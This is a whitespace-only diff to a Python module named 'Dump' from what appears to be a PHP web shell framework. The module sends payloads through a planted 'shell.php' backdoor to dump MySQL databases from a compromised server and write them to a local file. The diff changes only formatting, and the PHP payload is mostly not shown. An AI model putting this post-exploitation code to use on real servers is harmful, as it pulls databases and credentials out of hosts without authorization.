@@ -10,14 +10,14 @@ import random
 from core.parameters import ParametersList, Parameter as P
 
 classname = 'Dump'
- 
-    
+
+
 class Dump(Module):
     '''Get SQL database dump
     :sql.dump mysql <host> <user> <pass> <db name> <table name>|any
     '''
 
-    
+
     vectors = VectorList( [
             Vector('shell.php', 'mysqlphpdump', """
 function dmp ($table)
@@ -114,28 +114,28 @@ mysql_close();
 
 
     def __init__( self, modhandler , url, password):
-            
+
         self.structure = {}
 
         Module.__init__(self, modhandler, url, password)
-        
-        
+
+
 
     def run_module( self, mode, user, pwd , db, table, host, lpath ):
-        
+
         if mode != 'mysql':
             raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
-        
-        
+
+
         uri = '%s:%s@%s-%s' % (user, pwd, host, db)
-        
+
         vectors = self._get_default_vector2()
         if not vectors:
             vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells + [ 'sql.query' ])
         for vector in vectors:
             response = self.__execute_payload(vector, [mode, host, user, pwd, db, table])
             if response != None:
-                
+
                 if response.startswith('-- DEFAULT'):
                     # mysqlphpdump default fallback
                     self.mprint("[%s] Error connecting to '%s', using default (query 'SELECT USER();' to print out)" % ( self.name, uri))
@@ -143,59 +143,58 @@ mysql_close();
                 elif 'mysqldump: Got error:' in response:
                     # mysqldump output but error
                     self.mprint("[%s] Error connecting to '%s', check credentials and db name" % ( self.name, uri))
-                
+
                 try:
                     if lpath == 'auto':
                         lpath = '%s.txt' % uri
-                    
+
                     self.mprint("[%s] Saving '%s' dump in '%s'" % (self.name, uri, lpath))
 
                     lfile = open(lpath,'w')
                 except:
                     raise ModuleException(self.name,  "Error opening dump file \'%s\'" % lpath)
-                                    
+
                 self.params.set_and_check_parameters({'vector' : vector.name})
-                
+
                 lfile.write(response)
                 lfile.close()
                 return
-        
+
         self.mprint('[%s] Error dumping \'%s\', check credentials, host and database name' % (self.name, uri))
-            
-        
+
+
     def __execute_payload(self, vector, parameters):
-        
+
         mode = parameters[0]
         host = parameters[1]
         user = parameters[2]
         pwd = parameters[3]
         db = parameters[4]
         table = parameters[5]
-        
+
         if table == 'any':
             table = ''
-        
+
         self.modhandler.set_verbosity(2)
-        
+
         self.structure[db] = {}
-          
-        payload = self.__prepare_payload(vector, [host, user, pwd, db, table]) 
+
+        payload = self.__prepare_payload(vector, [host, user, pwd, db, table])
         response = self.modhandler.load(vector.interpreter).run({ 0: payload })
-        
+
         self.modhandler.set_verbosity()
-        
+
         if response:
             return response
-            
+
     def __prepare_payload( self, vector, parameters):
 
         if vector.payloads[0].count( '%s' ) == len(parameters):
             return vector.payloads[0] % tuple(parameters)
         else:
             raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
-        
 
-                
-    
-    
-    
+
+
+
+
